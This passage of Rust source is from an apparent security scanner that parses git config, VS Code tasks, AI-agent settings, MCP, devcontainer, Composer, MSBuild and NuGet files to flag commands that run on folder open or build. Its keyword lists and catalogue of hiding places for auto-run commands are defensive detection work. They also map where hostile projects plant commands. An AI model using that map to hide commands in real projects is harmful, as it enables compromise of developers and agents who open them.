//! Commands that project files declare for tools to run by themselves.
//!
//! A hidden command is the most useful thing a hostile project can carry, so these files are read,
//! not just listed. Each one becomes the same facts a `package.json` script does: a
//! `LifecycleScript` fact that says when it runs (`ScriptTrigger`), and an unresolved
//! `ShellCommand` fact on the same text, because the command is quoted and not followed.
//!
//! Read here:
//! - `.git/config`: git settings that run a program (`core.fsmonitor`, `core.sshCommand`, filter
//!   and diff drivers, credential helpers, `core.hooksPath`, aliases).
//! - `.vscode/tasks.json`: tasks, and which of them run when the folder opens.
//! - `.claude/settings.json` and `settings.local.json`: agent hooks and helper commands.
//! - `.mcp.json`, `.cursor/mcp.json`, `.vscode/mcp.json`: MCP servers, which are started as commands.
//! - `devcontainer.json`: the commands a dev container runs, and its features.
//! - `composer.json`: Composer script events.
//! - `global.json`: MSBuild SDKs, whose props and targets run during a build.
//! - MSBuild files (`Directory.Build.props` and `.targets`, `*.csproj`, `*.props`, `*.targets`):
//!   targets that hook into a build, `Exec` and other tasks, pre- and post-build events, inline and
//!   assembly tasks, analyzers, SDKs from NuGet, tool redirects and imports.
//! - `nuget.config`: package sources other than the public feed, and where credentials are stored.
//! - TOML (`tomlcfg.rs`): `.cargo/config.toml`, `Cargo.toml`, `rust-toolchain`, `pyproject.toml`, `mise.toml`,
//!   `.codex/config.toml`. And `.gemini/settings.json`, read like the other agent files.
//!
//! A file that does not parse gets a `ParseFailed` fact, so it stays visible and the brief says
//! incomplete. Repeated keys are flagged, as in `package.json`: parsers disagree about which one
//! wins, so a repeat is a way to hide a command.
//!
//! Not followed: what a command does (`node ./x.js` is quoted, not read), files named by
//! `include.path`, and keys not listed above.

mod tomlcfg;

use super::json::{self, Jv, Kind, Member};
use super::xml::{self, Element};
use forge_analysis_schema::{
    number_repeats, FactKind, Quoted, RelPath, Script, ScriptTrigger, Span, StaticFact, UnresolvedReason,
};
use std::collections::{BTreeMap, BTreeSet};

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Manifest {
    GitConfig,
    Tasks,
    Claude,
    Mcp,
    DevContainer,
    Composer,
    GlobalJson,
    Msbuild,
    NuGet,
    CargoConfig,
    CargoToml,
    RustToolchain,
    Pyproject,
    Mise,
    Codex,
}

/// Imports of the toolset itself, which every project has.
const STANDARD_IMPORTS: &[&str] = &[
    "$(msbuildtoolspath)",
    "$(msbuildtoolsversion)",
    "$(msbuildextensionspath",
    "$(msbuildbinpath)",
    "$(vstoolspath)",
    "$(msbuildprogramfiles32)",
    "$(msbuildsdkspath)",
];

/// Properties that make the build run a program from a path in place of the one the SDK picks.
const TOOL_REDIRECTS: &[&str] = &[
    "csctoolpath",
    "csctoolexe",
    "vbctoolpath",
    "vbctoolexe",
    "fsctoolpath",
    "fsctoolexe",
    "roslyntargetspath",
    "nugetexepath",
    "dotnethostpath",
    "msbuildtoolspath",
    "msbuildsdkspath",
];

/// Properties that change where restored packages come from or go to.
const PACKAGE_REDIRECTS: &[&str] = &[
    "restoresources",
    "restoreadditionalprojectsources",
    "restorefallbackfolders",
    "restorepackagespath",
    "nugetconfigfile",
];

/// Tasks that ship with MSBuild and do bookkeeping or plain file work. They are not reported. `Exec`,
/// `DownloadFile` and everything else (`Unzip`, the `MSBuild` task, tasks from a `UsingTask`) is.
const BUILTIN_TASKS: &[&str] = &[
    "message",
    "warning",
    "error",
    "itemgroup",
    "propertygroup",
    "onerror",
    "output",
    "calltarget",
    "createitem",
    "createproperty",
    "readlinesfromfile",
    "writelinestofile",
    "copy",
    "move",
    "delete",
    "removedir",
    "makedir",
    "touch",
    "getfilehash",
    "hash",
    "assignculture",
    "assigntargetpath",
    "findunderpath",
    "removeduplicates",
    "converttoabsolutepath",
    "getassemblyidentity",
    "resolvepackagefilepath",
];

/// The sources NuGet uses when nothing says otherwise.
const NUGET_ORG: &[&str] = &["https://api.nuget.org/v3/index.json", "https://www.nuget.org/api/v2", "https://nuget.org/api/v2"];

fn names_in(list: &str) -> Vec<String> {
    list.split(';').map(|s| s.trim().to_ascii_lowercase()).filter(|s| !s.is_empty()).collect()
}

fn normalise(path: &str) -> String {
    path.to_ascii_lowercase().replace('\\', "/")
}

fn ends(path: &str, suffix: &str) -> bool {
    path == suffix || path.ends_with(&format!("/{suffix}"))
}

/// Which manifest this is, and whether its own format allows comments and trailing commas.
fn manifest(path: &str) -> Option<(Manifest, bool)> {
    let name = path.rsplit('/').next().unwrap_or("");
    if ends(path, ".git/config") {
        Some((Manifest::GitConfig, false))
    } else if ends(path, ".vscode/tasks.json") {
        Some((Manifest::Tasks, true))
    } else if ends(path, ".claude/settings.json") || ends(path, ".claude/settings.local.json") {
        Some((Manifest::Claude, false))
    } else if name == ".mcp.json" || ends(path, ".cursor/mcp.json") {
        Some((Manifest::Mcp, false))
    } else if ends(path, ".vscode/mcp.json") {
        Some((Manifest::Mcp, true))
    } else if name == ".devcontainer.json" || (name == "devcontainer.json" && format!("/{path}").contains("/.devcontainer/")) {
        Some((Manifest::DevContainer, true))
    } else if name == "composer.json" {
        Some((Manifest::Composer, false))
    } else if name == "global.json" {
        Some((Manifest::GlobalJson, true))
    } else if name == "nuget.config" {
        Some((Manifest::NuGet, false))
    } else if ends(path, ".cargo/config.toml") || ends(path, ".cargo/config") {
        Some((Manifest::CargoConfig, false))
    } else if name == "cargo.toml" {
        Some((Manifest::CargoToml, false))
    } else if name == "rust-toolchain" || name == "rust-toolchain.toml" {
        Some((Manifest::RustToolchain, false))
    } else if name == "pyproject.toml" {
        Some((Manifest::Pyproject, false))
    } else if matches!(name, "mise.toml" | ".mise.toml" | "mise.local.toml" | ".mise.local.toml") {
        Some((Manifest::Mise, false))
    } else if ends(path, ".codex/config.toml") {
        Some((Manifest::Codex, false))
    } else if ends(path, ".gemini/settings.json") {
        Some((Manifest::Mcp, true))
    } else if matches!(
        name,
        "directory.build.props"
            | "directory.build.targets"
            | "directory.solution.props"
            | "directory.solution.targets"
            | "directory.packages.props"
    ) || ["csproj", "fsproj", "vbproj", "vcxproj", "proj", "props", "targets"]
        .iter()
        .any(|e| name.rsplit_once('.').is_some_and(|(_, x)| x == *e))
    {
        Some((Manifest::Msbuild, false))
    } else {
        None
    }
}

/// Is this a file `analyze_config` reads? A quick scan visits these first.
pub fn is_config_manifest(path: &str) -> bool {
    manifest(&normalise(path)).is_some()
}

#[derive(Debug, Clone)]
pub struct ConfigAnalysis {
    pub facts: Vec<StaticFact>,
}

/// `None` if `file` is not one of the manifests above.
pub fn analyze_config(file: &RelPath, src: &str) -> Option<ConfigAnalysis> {
    let (kind, lenient) = manifest(&normalise(file.as_quoted().text()))?;
    let mut cf = Cf::new(file, src);
    if kind == Manifest::GitConfig {
        cf.git_config();
    } else if matches!(
        kind,
        Manifest::CargoConfig | Manifest::CargoToml | Manifest::RustToolchain | Manifest::Pyproject | Manifest::Mise | Manifest::Codex
    ) {
        cf.toml_file(kind);
    } else if matches!(kind, Manifest::Msbuild | Manifest::NuGet) {
        match xml::parse(src) {
            Err(_) => cf.unresolved(0, cf.len(), UnresolvedReason::ParseFailed, None),
            Ok(root) if kind == Manifest::Msbuild => cf.msbuild(&root),
            Ok(root) => cf.nuget(&root),
        }
    } else {
        let parsed = if lenient { json::parse_lenient(src) } else { json::parse(src) };
        match parsed {
            Err(_) => cf.unresolved(0, cf.len(), UnresolvedReason::ParseFailed, None),
            Ok(root) => match kind {
                Manifest::Tasks => cf.tasks(&root),
                Manifest::Claude => cf.claude(&root),
                Manifest::Mcp => cf.mcp(&root),
                Manifest::DevContainer => cf.dev_container(&root),
                Manifest::Composer => cf.composer(&root),
                Manifest::GlobalJson => cf.global(&root),
                _ => {}
            },
        }
    }
    cf.facts.sort_by_key(|f| (f.at().start_byte, f.at().end_byte));
    number_repeats(&mut cf.facts);
    Some(ConfigAnalysis { facts: cf.facts })
}

fn obj(v: &Jv) -> Option<&[Member]> {
    match &v.kind {
        Kind::Object(m) => Some(m),
        _ => None,
    }
}

/// The value a repeated key ends up with in most parsers: the last one.
fn last<'a>(ms: &'a [Member], key: &str) -> Option<&'a Jv> {
    ms.iter().rev().find(|m| m.key == key).map(|m| &m.value)
}

fn string(v: &Jv) -> Option<&str> {
    match &v.kind {
        Kind::Str(s) => Some(s),
        _ => None,
    }
}

/// A command as an editor reads it: a string, a list of words, or `{ "value": "..." }`.
fn words(v: &Jv) -> Option<String> {
    match &v.kind {
        Kind::Str(s) => Some(s.clone()),
        Kind::Array(items) => {
            let mut parts = Vec::new();
            for it in items {
                parts.push(words(it)?);
            }
            Some(parts.join(" "))
        }
        Kind::Object(ms) => last(ms, "value").and_then(string).map(str::to_string),
        _ => None,
    }
}

/// `command` and its `args` as one line.
fn command_line(command: &Jv, args: Option<&Jv>) -> Option<String> {
    let mut line = words(command)?;
    if let Some(a) = args {
        let rest = words(a)?;
        if !rest.is_empty() {
            line.push(' ');
            line.push_str(&rest);
        }
    }
    Some(line)
}

struct Cf<'s> {
    file: &'s RelPath,
    src: &'s str,
    starts: Vec<u32>,
    facts: Vec<StaticFact>,
}

impl<'s> Cf<'s> {
    fn new(file: &'s RelPath, src: &'s str) -> Self {
        let mut starts = vec![0u32];
        for (i, b) in src.bytes().enumerate() {
            if b == b'\n' {
                starts.push(u32::try_from(i + 1).unwrap_or(u32::MAX));
            }
        }
        Self { file, src, starts, facts: Vec::new() }
    }

    fn len(&self) -> u32 {
        u32::try_from(self.src.len()).unwrap_or(u32::MAX)
    }

    fn span(&self, start: u32, end: u32) -> Span {
        let line = |o: u32| self.starts.partition_point(|&s| s <= o) as u32;
        Span {
            file: self.file.clone(),
            start_line: line(start),
            end_line: line(end.saturating_sub(1).max(start)),
            start_byte: start,
            end_byte: end,
        }
    }

    fn unresolved(&mut self, start: u32, end: u32, why: UnresolvedReason, detail: Option<&str>) {
        let mut f = StaticFact::new(FactKind::Unresolved, self.span(start, end), detail.map(Quoted::new));
        f.unresolved = Some(why);
        self.facts.push(f);
    }

    fn unsupported(&mut self, v: &Jv) {
        self.unresolved(v.start, v.end, UnresolvedReason::UnsupportedSyntax, None);
    }

    /// Something that runs, when it runs, and what it is.
    fn script(&mut self, name: &str, detail: &str, start: u32, end: u32, trigger: ScriptTrigger) {
        let mut f = StaticFact::new(FactKind::LifecycleScript, self.span(start, end), Some(Quoted::new(detail)));
        f.script = Some(Script { name: Quoted::new(name), trigger });
        self.facts.push(f);
    }

    /// A command line: the script fact, and a not-followed fact on the same text, so the report
    /// shows it under the script and the brief cannot call the file fully read.
    fn command(&mut self, name: &str, cmd: &str, start: u32, end: u32, trigger: ScriptTrigger) {
        self.script(name, cmd, start, end, trigger);
        self.unresolved(start, end, UnresolvedReason::ShellCommand, Some(cmd));
    }

    /// The members of an object that count, with every earlier repeat of a key flagged. One pass
    /// over a map, so a file with a hundred thousand keys costs no more than it should.
    fn effective<'j>(&mut self, members: &'j [Member]) -> Vec<&'j Member> {
        let mut last: BTreeMap<&str, usize> = BTreeMap::new();
        for (i, m) in members.iter().enumerate() {
            last.insert(m.key.as_str(), i);
        }
        let mut out = Vec::new();
        for (i, m) in members.iter().enumerate() {
            if last[m.key.as_str()] == i {
                out.push(m);
            } else {
                self.unresolved(m.key_start, m.key_end, UnresolvedReason::AmbiguousBinding, Some(&m.key));
            }
        }
        out
    }

    // ---- .vscode/tasks.json ----

    fn tasks(&mut self, root: &Jv) {
        let Some(ms) = obj(root) else {
            self.unsupported(root);
            return;
        };
        let top = self.effective(ms);
        let get = |k: &str| top.iter().find(|m| m.key == k).map(|m| &m.value);
        // The old single-task layout has the command at the top.
        if let Some(cmd) = get("command") {
            match command_line(cmd, get("args")) {
                Some(t) => self.command("tasks.json", &t, cmd.start, cmd.end, ScriptTrigger::Manual),
                None => self.unsupported(cmd),
            }
        }
        let items = match get("tasks") {
            None => return,
            Some(v) => match &v.kind {
                Kind::Array(items) => items,
                _ => {
                    self.unsupported(v);
                    return;
                }
            },
        };

        struct Task<'a> {
            label: String,
            jv: &'a Jv,
            ms: Vec<&'a Member>,
            auto: bool,
        }
        let mut tasks: Vec<Task<'_>> = Vec::new();
        for it in items {
            let Some(m) = obj(it) else {
                self.unsupported(it);
                continue;
            };
            let eff = self.effective(m);
            let field = |k: &str| eff.iter().find(|x| x.key == k).map(|x| &x.value);
            let label = field("label").and_then(string).map(str::to_string).unwrap_or_else(|| {
                let kind = field("type").and_then(string).unwrap_or("task");
                let what = field("script").or(field("task")).or(field("command")).and_then(string).unwrap_or("");
                format!("{kind}: {what}")
            });
            let auto = field("runOptions")
                .and_then(obj)
                .and_then(|o| last(o, "runOn"))
                .and_then(string)
                .is_some_and(|s| s == "folderOpen");
            tasks.push(Task { label, jv: it, ms: eff, auto });
        }

        // A task that a folder-open task depends on runs when the folder opens too. Labels are looked
        // up in a map and each task is queued once, so this is linear in the size of the file.
        let mut by_label: BTreeMap<&str, Vec<usize>> = BTreeMap::new();
        for (i, t) in tasks.iter().enumerate() {
            by_label.entry(t.label.as_str()).or_default().push(i);
        }
        let mut auto: Vec<bool> = tasks.iter().map(|t| t.auto).collect();
        let mut queue: Vec<usize> = (0..tasks.len()).filter(|&i| auto[i]).collect();
        while let Some(i) = queue.pop() {
            let deps = tasks[i].ms.iter().find(|m| m.key == "dependsOn").map(|m| dep_labels(&m.value)).unwrap_or_default();
            for d in deps {
                for &j in by_label.get(d.as_str()).into_iter().flatten() {
                    if !auto[j] {
                        auto[j] = true;
                        queue.push(j);
                    }
                }
            }
        }

        for (i, t) in tasks.iter().enumerate() {
            let trigger = if auto[i] { ScriptTrigger::OnOpen } else { ScriptTrigger::Manual };
            let field = |k: &str| t.ms.iter().find(|x| x.key == k).map(|x| &x.value);
            let base_args = field("args");
            if let Some(cmd) = field("command") {
                match command_line(cmd, base_args) {
                    Some(line) => self.command(&t.label, &line, cmd.start, cmd.end, trigger),
                    None => self.unsupported(cmd),
                }
            } else if let Some(script) = field("script").and_then(string) {
                let v = field("script").unwrap();
                self.command(&t.label, &format!("npm run {script}"), v.start, v.end, trigger);
            } else if let Some(task) = field("task").and_then(string) {
                let v = field("task").unwrap();
                let kind = field("type").and_then(string).unwrap_or("task");
                self.command(&t.label, &format!("{kind} {task}"), v.start, v.end, trigger);
            } else if !["windows", "linux", "osx"].iter().any(|os| field(os).is_some()) {
                self.unsupported(t.jv);
            }
            // Per-platform overrides replace the command on that platform.
            for os in ["windows", "linux", "osx"] {
                let Some(o) = field(os).and_then(obj) else { continue };
                let own = last(o, "command");
                if let Some(cmd) = own.or(field("command")) {
                    let args = last(o, "args").or(base_args);
                    match command_line(cmd, args) {
                        Some(line) => self.command(&format!("{} ({os})", t.label), &line, cmd.start, cmd.end, trigger),
                        None => self.unsupported(cmd),
                    }
                }
            }
        }
    }

    // ---- .claude/settings.json ----

    fn claude(&mut self, root: &Jv) {
        let Some(ms) = obj(root) else {
            self.unsupported(root);
            return;
        };
        for m in self.effective(ms) {
            match m.key.as_str() {
                "hooks" => self.claude_hooks(&m.value),
                "statusLine" => match obj(&m.value).and_then(|s| last(s, "command")) {
                    Some(c) if string(c).is_some() => {
                        self.command("statusLine", string(c).unwrap_or(""), c.start, c.end, ScriptTrigger::OnOpen)
                    }
                    _ => self.unsupported(&m.value),
                },
                "apiKeyHelper" | "awsAuthRefresh" | "awsCredentialExport" | "otelHeadersHelper" => match string(&m.value) {
                    Some(s) => self.command(&m.key, s, m.value.start, m.value.end, ScriptTrigger::OnOpen),
                    None => self.unsupported(&m.value),
                },
                _ => {}
            }
        }
    }

    fn claude_hooks(&mut self, v: &Jv) {
        let Some(events) = obj(v) else {
            self.unsupported(v);
            return;
        };
        for ev in self.effective(events) {
            let Kind::Array(groups) = &ev.value.kind else {
                self.unsupported(&ev.value);
                continue;
            };
            for g in groups {
                let Some(gm) = obj(g) else {
                    self.unsupported(g);
                    continue;
                };
                let name = match last(gm, "matcher").and_then(string) {
                    Some(m) if !m.is_empty() => format!("{}[{m}]", ev.key),
                    _ => ev.key.clone(),
                };
                let Some(Kind::Array(hooks)) = last(gm, "hooks").map(|h| &h.kind) else {
                    self.unsupported(g);
                    continue;
                };
                for h in hooks {
                    let Some(hm) = obj(h) else {
                        self.unsupported(h);
                        continue;
                    };
                    match last(hm, "command") {
                        Some(c) if string(c).is_some() => {
                            self.command(&name, string(c).unwrap_or(""), c.start, c.end, ScriptTrigger::OnOpen)
                        }
                        _ => {
                            let kind = last(hm, "type").and_then(string).unwrap_or("?");
                            self.unresolved(h.start, h.end, UnresolvedReason::UnsupportedSyntax, Some(&format!("hook of type {kind}")));
                        }
                    }
                }
            }
        }
    }

    // ---- MCP servers ----

    fn mcp(&mut self, root: &Jv) {
        let Some(ms) = obj(root) else {
            self.unsupported(root);
            return;
        };
        for m in self.effective(ms) {
            if m.key != "mcpServers" && m.key != "servers" {
                continue;
            }
            let Some(servers) = obj(&m.value) else {
                self.unsupported(&m.value);
                continue;
            };
            for s in self.effective(servers) {
                let Some(sm) = obj(&s.value) else {
                    self.unsupported(&s.value);
                    continue;
                };
                if let Some(cmd) = last(sm, "command") {
                    match command_line(cmd, last(sm, "args")) {
                        Some(line) => self.command(&s.key, &line, cmd.start, cmd.end, ScriptTrigger::OnOpen),
                        None => self.unsupported(cmd),
                    }
                } else if let Some(url) = last(sm, "url").and_then(string) {
                    // A server we do not run, and cannot see: say so.
                    self.unresolved(s.value.start, s.value.end, UnresolvedReason::UnsupportedSyntax, Some(&format!("remote MCP server {url}")));
                } else {
                    self.unsupported(&s.value);
                }
            }
        }
    }

    // ---- devcontainer.json ----

    fn dev_command(&mut self, name: &str, v: &Jv, depth: u32) {
        match &v.kind {
            Kind::Str(_) | Kind::Array(_) => match words(v) {
                Some(line) => self.command(name, &line, v.start, v.end, ScriptTrigger::OnOpen),
                None => self.unsupported(v),
            },
            // Several commands that run in parallel, by name.
            Kind::Object(ms) if depth == 0 => {
                for m in self.effective(ms) {
                    self.dev_command(&format!("{name}.{}", m.key), &m.value, 1);
                }
            }
            _ => self.unsupported(v),
        }
    }

    fn dev_container(&mut self, root: &Jv) {
        let Some(ms) = obj(root) else {
            self.unsupported(root);
            return;
        };
        for m in self.effective(ms) {
            match m.key.as_str() {
                "initializeCommand" | "onCreateCommand" | "updateContentCommand" | "postCreateCommand" | "postStartCommand"
                | "postAttachCommand" => self.dev_command(&m.key, &m.value, 0),
                // Each feature is a package whose install script runs when the container is built.
                "features" => match obj(&m.value) {
                    Some(fs) => {
                        for f in self.effective(fs) {
                            self.script("feature", &f.key, f.key_start, f.value.end, ScriptTrigger::OnOpen);
                        }
                    }
                    None => self.unsupported(&m.value),
                },
                _ => {}
            }
        }
    }

    // ---- composer.json ----

    fn composer(&mut self, root: &Jv) {
        let Some(ms) = obj(root) else {
            self.unsupported(root);
            return;
        };
        for m in self.effective(ms) {
            if m.key != "scripts" {
                continue;
            }
            let Some(scripts) = obj(&m.value) else {
                self.unsupported(&m.value);
                continue;
            };
            for s in self.effective(scripts) {
                let trigger = composer_trigger(&s.key);
                match &s.value.kind {
                    Kind::Str(c) => self.command(&s.key, c, s.value.start, s.value.end, trigger),
                    Kind::Array(items) => {
                        for it in items {
                            match string(it) {
                                Some(c) => self.command(&s.key, c, it.start, it.end, trigger),
                                None => self.unsupported(it),
                            }
                        }
                    }
                    _ => self.unsupported(&s.value),
                }
            }
        }
    }

    // ---- global.json ----

    fn global(&mut self, root: &Jv) {
        let Some(ms) = obj(root) else {
            self.unsupported(root);
            return;
        };
        for m in self.effective(ms) {
            if m.key != "msbuild-sdks" {
                continue;
            }
            let Some(sdks) = obj(&m.value) else {
                self.unsupported(&m.value);
                continue;
            };
            for s in self.effective(sdks) {
                let version = string(&s.value).unwrap_or("");
                // The SDK is a package; its props and targets are imported into every project.
                self.script("msbuild-sdk", &format!("{}/{version}", s.key), s.key_start, s.value.end, ScriptTrigger::OnBuild);
            }
        }
    }

    // ---- MSBuild projects, props and targets; nuget.config ----

    /// `Sdk="Name/Version;Other"`: SDKs from NuGet whose props and targets run during every build.
    /// The ones Microsoft ships with the .NET SDK are not reported.
    fn sdk_list(&mut self, value: &str, start: u32, end: u32) {
        for part in value.split(';') {
            let part = part.trim();
            let name = part.split('/').next().unwrap_or("").to_ascii_lowercase();
            if part.is_empty() || name.starts_with("microsoft.net.sdk") || name.starts_with("microsoft.build.") {
                continue;
            }
            self.script("msbuild-sdk", part, start, end, ScriptTrigger::OnBuild);
        }
    }

    fn msbuild(&mut self, root: &Element) {
        if !root.is("Project") {
            self.unresolved(root.start, root.end, UnresolvedReason::UnsupportedSyntax, Some("not an MSBuild project"));
            return;
        }
        if let Some(a) = root.attr("Sdk") {
            self.sdk_list(&a.value, a.start, a.end);
        }
        let mut initial: BTreeSet<String> = BTreeSet::new();
        for attr in ["InitialTargets", "DefaultTargets"] {
            if let Some(a) = root.attr(attr) {
                initial.extend(names_in(&a.value));
            }
        }
        let mut targets: Vec<&Element> = Vec::new();
        self.msbuild_children(root, &mut targets);
        self.msbuild_targets(&targets, &initial);
    }

    fn msbuild_children<'e>(&mut self, parent: &'e Element, targets: &mut Vec<&'e Element>) {
        for c in parent.elements() {
            let name = c.name.to_ascii_lowercase();
            match name.as_str() {
                "target" => targets.push(c),
                "sdk" => {
                    if let Some(n) = c.attr("Name") {
                        let v = c.attr("Version").map(|v| format!("/{}", v.value)).unwrap_or_default();
                        self.sdk_list(&format!("{}{v}", n.value), c.start, c.end);
                    }
                }
                "import" => {
                    if let Some(s) = c.attr("Sdk") {
                        self.sdk_list(&s.value, s.start, s.end);
                    }
                    if let Some(p) = c.attr("Project") {
                        // `Sdk.props` and the toolset files are the standard ones; anything else is a file we
                        // do not follow yet, and it can hold targets.
                        let low = p.value.to_ascii_lowercase();
                        let standard = low == "sdk.props"
                            || low == "sdk.targets"
                            || STANDARD_IMPORTS.iter().any(|s| low.starts_with(s));
                        if !standard {
                            self.unresolved(c.start, c.end, UnresolvedReason::UnsupportedSyntax, Some(&format!("import {}", p.value)));
                        }
                    }
                }
                "propertygroup" => self.msbuild_properties(c),
                "itemgroup" => self.msbuild_items(c),
                "usingtask" => self.msbuild_using_task(c),
                "choose" => {
                    for branch in c.elements() {
                        self.msbuild_children(branch, targets);
                    }
                }
                _ => {}
            }
        }
    }

    fn msbuild_properties(&mut self, group: &Element) {
        for p in group.elements() {
            let name = p.name.to_ascii_lowercase();
            let Some((text, ts, te)) = p.text() else { continue };
            let text = text.trim();
            if name == "prebuildevent" || name == "postbuildevent" {
                self.command(&p.name, text, ts, te, ScriptTrigger::OnBuild);
            } else if TOOL_REDIRECTS.contains(&name.as_str()) {
                // Runs a program from this path in place of the one the SDK would use.
                self.script(&p.name, &format!("{} = {text}", p.name), ts, te, ScriptTrigger::OnBuild);
            } else if PACKAGE_REDIRECTS.contains(&name.as_str()) {
                self.unresolved(ts, te, UnresolvedReason::UnsupportedSyntax, Some(&format!("{} = {text}", p.name)));
            }
        }
    }

    fn msbuild_items(&mut self, group: &Element) {
        for item in group.elements() {
            let name = item.name.to_ascii_lowercase();
            let analyzer = name == "analyzer"
                || (name == "projectreference"
                    && item.attr("OutputItemType").is_some_and(|a| a.value.to_ascii_lowercase().contains("analyzer")));
            if analyzer {
                // Analyzers are loaded into the compiler: their code runs on every build.
                let what = item.attr("Include").or_else(|| item.attr("Update")).map(|a| a.value.as_str()).unwrap_or("");
                self.script("analyzer", what, item.start, item.end, ScriptTrigger::OnBuild);
            }
        }
    }

    fn msbuild_using_task(&mut self, ut: &Element) {
        let task = ut.attr("TaskName").map(|a| a.value.as_str()).unwrap_or("?");
        let inline = ut.elements().find(|e| e.is("Task")).and_then(|t| t.elements().find(|c| c.is("Code")));
        let name = format!("UsingTask {task}");
        if let Some((code, _, _)) = inline.and_then(|c| c.text()) {
            // Code compiled and run by the build.
            self.script(&name, &code, ut.start, ut.end, ScriptTrigger::OnBuild);
            self.unresolved(ut.start, ut.end, UnresolvedReason::UnsupportedSyntax, Some("inline task code is not analysed"));
        } else {
            let from = ut
                .attr("AssemblyFile")
                .or_else(|| ut.attr("AssemblyName"))
                .map(|a| a.value.as_str())
                .unwrap_or("?");
            self.script(&name, from, ut.start, ut.end, ScriptTrigger::OnBuild);
            self.unresolved(ut.start, ut.end, UnresolvedReason::UnsupportedSyntax, Some(&format!("task assembly {from} is not analysed")));
        }
    }

    fn msbuild_targets(&mut self, targets: &[&Element], initial: &BTreeSet<String>) {
        // A target runs by itself if it asks to run before or after another target, or the project names
        // it as an initial or default target. So does every target such a target calls or depends on.
        let hooked = |t: &Element| {
            ["BeforeTargets", "AfterTargets"].iter().any(|a| t.attr(a).is_some_and(|v| !v.value.trim().is_empty()))
        };
        let tname = |t: &Element| t.attr("Name").map(|a| a.value.to_ascii_lowercase()).unwrap_or_default();
        let mut by_name: BTreeMap<String, Vec<usize>> = BTreeMap::new();
        for (i, t) in targets.iter().enumerate() {
            by_name.entry(tname(t)).or_default().push(i);
        }
        let mut auto: Vec<bool> = targets.iter().map(|t| hooked(t) || initial.contains(&tname(t))).collect();
        let mut queue: Vec<usize> = (0..targets.len()).filter(|&i| auto[i]).collect();
        while let Some(i) = queue.pop() {
            let t = targets[i];
            let mut called: Vec<String> = t.attr("DependsOnTargets").map(|a| names_in(&a.value)).unwrap_or_default();
            for c in t.elements().filter(|c| c.is("CallTarget")) {
                if let Some(a) = c.attr("Targets") {
                    called.extend(names_in(&a.value));
                }
            }
            for n in called {
                for &j in by_name.get(&n).into_iter().flatten() {
                    if !auto[j] {
                        auto[j] = true;
                        queue.push(j);
                    }
                }
            }
        }
        for (i, t) in targets.iter().enumerate() {
            let trigger = if auto[i] { ScriptTrigger::OnBuild } else { ScriptTrigger::Manual };
            let target = t.attr("Name").map(|a| a.value.as_str()).unwrap_or("(unnamed)");
            for c in t.elements() {
                let task = c.name.to_ascii_lowercase();
                match task.as_str() {
                    "exec" => match c.attr("Command") {
                        Some(cmd) => self.command(target, &cmd.value, cmd.start, cmd.end, trigger),
                        None => self.unresolved(c.start, c.end, UnresolvedReason::UnsupportedSyntax, Some("Exec without a Command")),
                    },
                    "downloadfile" => {
                        let url = c.attr("SourceUrl").map(|a| a.value.as_str()).unwrap_or("?");
                        self.script(&format!("{target}/DownloadFile"), url, c.start, c.end, trigger);
                    }
                    t if BUILTIN_TASKS.contains(&t) => {}
                    // Unzip, the MSBuild task (which runs other projects), and tasks from a `UsingTask`
                    // or an assembly: code we cannot see into. Only reported where it runs by itself.
                    _ if auto[i] => {
                        let mut what = c.name.clone();
                        for a in c.attrs.iter().take(4) {
                            what.push_str(&format!(" {}={}", a.name, a.value));
                        }
                        self.script(&format!("{target}/{}", c.name), &what, c.start, c.end, trigger);
                        self.unresolved(c.start, c.end, UnresolvedReason::UnsupportedSyntax, Some(&format!("task {} is not analysed", c.name)));
                    }
                    _ => {}
                }
            }
        }
    }

    fn nuget(&mut self, root: &Element) {
        if !root.is("configuration") {
            self.unresolved(root.start, root.end, UnresolvedReason::UnsupportedSyntax, Some("not a nuget.config"));
            return;
        }
        for section in root.elements() {
            let sname = section.name.to_ascii_lowercase();
            match sname.as_str() {
                "packagesources" | "fallbackpackagefolders" => {
                    for add in section.elements().filter(|e| e.is("add")) {
                        let key = add.attr("key").map(|a| a.value.as_str()).unwrap_or("");
                        let value = add.attr("value").map(|a| a.value.as_str()).unwrap_or("");
                        let v = value.trim().trim_end_matches('/').to_ascii_lowercase();
                        // The public feed is the default; any other place packages come from is reported.
                        if sname == "packagesources" && NUGET_ORG.contains(&v.as_str()) {
                            continue;
                        }
                        self.unresolved(add.start, add.end, UnresolvedReason::UnsupportedSyntax, Some(&format!("package source {key}: {value}")));
                    }
                }
                "config" => {
                    for add in section.elements().filter(|e| e.is("add")) {
                        let key = add.attr("key").map(|a| a.value.to_ascii_lowercase()).unwrap_or_default();
                        if matches!(key.as_str(), "repositorypath" | "globalpackagesfolder" | "defaultpushsource") {
                            let value = add.attr("value").map(|a| a.value.as_str()).unwrap_or("");
                            self.unresolved(add.start, add.end, UnresolvedReason::UnsupportedSyntax, Some(&format!("{key}: {value}")));
                        }
                    }
                }
                // Credentials and API keys. The values are never quoted: only that they are here.
                "packagesourcecredentials" | "apikeys" => {
                    self.unresolved(section.start, section.end, UnresolvedReason::UnsupportedSyntax, Some(&format!("{} are stored here (values not shown)", section.name)));
                }
                _ => {}
            }
        }
    }

    // ---- .git/config ----

    fn git_config(&mut self) {
        let src = self.src;
        let mut pos = 0usize;
        let mut section = String::new();
        let mut sub: Option<String> = None;
        while pos < src.len() {
            let start = pos;
            let mut end = src[pos..].find('\n').map_or(src.len(), |i| pos + i);
            let mut logical = String::new();
            // A line ending in an odd number of backslashes continues on the next.
            loop {
                let line = &src[pos..end];
                let line = line.strip_suffix('\r').unwrap_or(line);
                let slashes = line.bytes().rev().take_while(|b| *b == b'\\').count();
                if slashes % 2 == 1 && end < src.len() {
                    logical.push_str(&line[..line.len() - 1]);
                    pos = end + 1;
                    end = src[pos..].find('\n').map_or(src.len(), |i| pos + i);
                    continue;
                }
                logical.push_str(line);
                break;
            }
            let line_end = end;
            pos = if end < src.len() { end + 1 } else { src.len() };
            self.ini_line(&logical, start as u32, line_end as u32, &mut section, &mut sub);
        }
    }

    fn ini_line(&mut self, text: &str, start: u32, end: u32, section: &mut String, sub: &mut Option<String>) {
        let mut rest = text.trim_start();
        if rest.is_empty() || rest.starts_with('#') || rest.starts_with(';') {
            return;
        }
        if let Some(h) = rest.strip_prefix('[') {
            match parse_header(h) {
                Some((sec, sb, after)) => {
                    *section = sec;
                    *sub = sb;
                    rest = after.trim_start();
                }
                None => {
                    self.unresolved(start, end, UnresolvedReason::ParseFailed, None);
                    return;
                }
            }
            if rest.is_empty() || rest.starts_with('#') || rest.starts_with(';') {
                return;
            }
        }
